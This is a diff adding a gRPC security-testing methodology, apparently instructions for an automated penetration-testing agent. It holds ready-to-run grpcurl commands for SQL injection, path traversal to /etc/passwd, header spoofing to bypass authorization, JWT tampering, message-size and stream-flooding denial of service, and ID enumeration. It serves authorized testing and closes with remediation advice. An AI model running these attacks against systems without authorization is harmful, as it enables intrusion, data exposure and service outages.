@@ -1,0 +1,169 @@
+## gRPC Deep Security Testing Methodology
+
+### Phase 1: Service Discovery & Reflection
+
+#### gRPC Reflection Enumeration
+- Check if server reflection is enabled (lists all services and methods):
+  ```bash
+  grpcurl -plaintext {target}:{port} list
+  grpcurl -plaintext {target}:{port} list <ServiceName>
+  grpcurl -plaintext {target}:{port} describe <ServiceName>.<MethodName>
+  ```
+- For TLS-enabled endpoints: `grpcurl {target}:{port} list`
+- Save full service definition: `grpcurl -plaintext {target}:{port} describe > /output/grpc-services.txt`
+- Map all RPC methods: `grpcurl -plaintext {target}:{port} list | while read svc; do grpcurl -plaintext {target}:{port} list $svc; done > /output/grpc-methods.txt`
+
+#### Port & Protocol Detection
+- Default gRPC ports: 50051, 9090, 8080, 443 (with TLS)
+- Detect HTTP/2: `curl -I --http2 {target}:{port}` — look for `h2` in ALPN
+- Check `content-type: application/grpc` in responses
+- `nmap -sV -p 50051,9090,8080 {target}` to identify gRPC services
+- `h2spec {target}:{port}` — HTTP/2 compliance and vulnerability checks
+
+#### Proto File Discovery
+- Look for `.proto` files in web root: `ffuf -u {target}/FUZZ -w wordlists/protos.txt`
+- Check GitHub repos, documentation, or JS bundles for proto definitions
+- Use reflection output to reconstruct `.proto` files
+
+### Phase 2: Message Fuzzing & Protobuf Manipulation
+
+#### Unary RPC Fuzzing
+- Fuzz individual fields with boundary values:
+  ```bash
+  grpcurl -plaintext -d '{"user_id": -1}' {target}:{port} UserService/GetUser
+  grpcurl -plaintext -d '{"user_id": 9999999999}' {target}:{port} UserService/GetUser
+  grpcurl -plaintext -d '{"username": "'\''OR 1=1--"}' {target}:{port} UserService/Login
+  ```
+- Omit required fields: `grpcurl -plaintext -d '{}' {target}:{port} UserService/GetUser`
+- Send wrong field types (string where int expected)
+- `delegate_to_coder`: Write Python script using `grpc` library with crafted protobuf messages
+
+#### Streaming RPC Fuzzing
+- Client streaming: send large number of messages
+- Server streaming: request resource-intensive subscriptions
+- Bidirectional: send malformed frames mid-stream
+
+#### Protobuf Wire Format Manipulation
+- Manually craft malformed protobuf binary:
+  ```python
+  # Use delegate_to_coder to generate:
+  import grpc
+  from google.protobuf import descriptor_pool, message_factory
+  # Craft message with unexpected field numbers, wrong wire types
+  ```
+- Field number 0 (invalid), large field numbers (>2^29)
+- Mixed wire types for same field number
+
+### Phase 3: Authentication & Authorization Bypass
+
+#### Unauthenticated Access
+- Remove all metadata headers and test each RPC method:
+  ```bash
+  grpcurl -plaintext -d '{"user_id": 1}' {target}:{port} AdminService/GetAllUsers
+  ```
+- Test methods that should require admin privileges without auth token
+
+#### Metadata Injection
+- Inject custom metadata headers to manipulate auth:
+  ```bash
+  grpcurl -plaintext -H 'authorization: Bearer <manipulated_jwt>' -d '{}' {target}:{port} AdminService/List
+  grpcurl -plaintext -H 'x-user-id: 0' -H 'x-role: admin' -d '{}' {target}:{port} UserService/GetUser
+  grpcurl -plaintext -H 'x-forwarded-for: 127.0.0.1' -d '{}' {target}:{port} InternalService/Exec
+  ```
+- Test internal-only service methods by spoofing internal IP headers
+- Inject duplicate authorization headers
+
+#### JWT/Token Manipulation in gRPC Metadata
+- Modify `sub`, `role`, `admin` claims in JWT bearer tokens
+- Test algorithm confusion (RS256→HS256, none)
+- `python3 jwt_tool.py <token> -T -S hs256 -p "secret"` then replay via grpcurl
+
+#### TLS/mTLS Bypass
+- Test if plain HTTP/2 (h2c) is accepted when TLS is expected
+- Check certificate validation: `grpcurl -insecure {target}:{port} list`
+- Test with expired/self-signed client certificates if mTLS is in use
+
+### Phase 4: Injection Attacks
+
+#### SQL Injection via Proto Fields
+- Inject into string fields used in database queries:
+  ```bash
+  grpcurl -plaintext -d '{"name": "'\'' OR 1=1--", "page": 1}' {target}:{port} SearchService/Search
+  ```
+- Test all string input fields across all RPC methods
+
+#### Command/Path Injection
+- If any method takes file paths or system commands:
+  `grpcurl -plaintext -d '{"path": "../../../../etc/passwd"}' {target}:{port} FileService/Read`
+
+#### NoSQL / ORM Injection
+- MongoDB operators in fields: `{"query": {"$gt": ""}}`
+- Prisma/Sequelize raw query escape
+
+### Phase 5: DoS & Resource Exhaustion
+
+#### Large Message DoS
+- Send maximum-size messages:
+  ```bash
+  # Generate 10MB payload
+  python3 -c "print('A'*10485760)" > /tmp/large_payload.txt
+  grpcurl -plaintext -d "{\"data\": \"$(cat /tmp/large_payload.txt)\"}" {target}:{port} DataService/Upload
+  ```
+- gRPC default max message size is 4MB — test at 4MB, 5MB, 100MB
+
+#### Stream Flooding
+- Open many concurrent streaming connections:
+  ```bash
+  for i in $(seq 1 50); do
+    grpcurl -plaintext -d '{"subscribe": true}' {target}:{port} EventService/Stream &
+  done
+  wait
+  ```
+
+#### Slow Read / Half-Close Attack
+- Open gRPC stream and stop reading server responses
+- Hold connections open indefinitely
+
+### Phase 6: Enumeration & IDOR
+
+#### ID Enumeration
+- Iterate object IDs across all Get/Fetch methods:
+  ```bash
+  for id in $(seq 1 1000); do
+    grpcurl -plaintext -d "{\"user_id\": $id}" {target}:{port} UserService/GetUser 2>/dev/null
+  done > /output/grpc-user-enum.txt
+  ```
+- Identify gaps (deleted records) vs errors (access denied) vs successes
+
+#### Service Method Brute Force
+- If reflection disabled, brute force common method names:
+  - GetUser, ListUsers, CreateUser, DeleteUser, UpdateUser
+  - GetOrder, ListOrders, AdminDashboard, InternalStatus
+
+### Phase 7: Custom Script Generation (Coder Sub-Agent)
+
+Use `delegate_to_coder` to generate:
+1. **Reflection dumper**: Full service enumeration to `/output/grpc-services.txt`
+2. **Method fuzzer**: Iterate all discovered methods with boundary inputs
+3. **Auth bypass tester**: Test each method without credentials and with manipulated JWTs
+4. **Metadata injector**: Test common internal-bypass headers on all methods
+5. **ID enumerator**: IDOR check across all Get methods
+
+Example delegation:
+```
+delegate_to_coder: "Write a Python script using the grpc library that:
+1. Connects to {target}:{port}
+2. Uses server reflection to list all services and methods
+3. For each method, attempts a call without authentication headers
+4. Logs any successful (non-UNAUTHENTICATED) responses to /output/grpc-auth-bypass.json"
+```
+
+### Findings Format
+
+Report gRPC findings with:
+- **Category**: gRPC-Reflection / gRPC-AuthBypass / gRPC-IDOR / gRPC-Injection / gRPC-DoS / gRPC-MetadataInjection
+- **Severity**: Critical (auth bypass, injection), High (IDOR, reflection in prod), Medium (DoS, enumeration)
+- **Evidence**: grpcurl command used, response received, sensitive data or bypass confirmed
+- **Remediation**: Disable reflection in production, enforce per-method auth, validate all input fields, set message size limits, rate-limit streaming RPCs
+- **CWE**: CWE-284 (improper access control), CWE-200 (info disclosure), CWE-400 (resource exhaustion), CWE-89 (SQL injection)
+- **OWASP**: API1:2023 Broken Object Level Auth, API2:2023 Broken Authentication, API4:2023 Unrestricted Resource Consumption
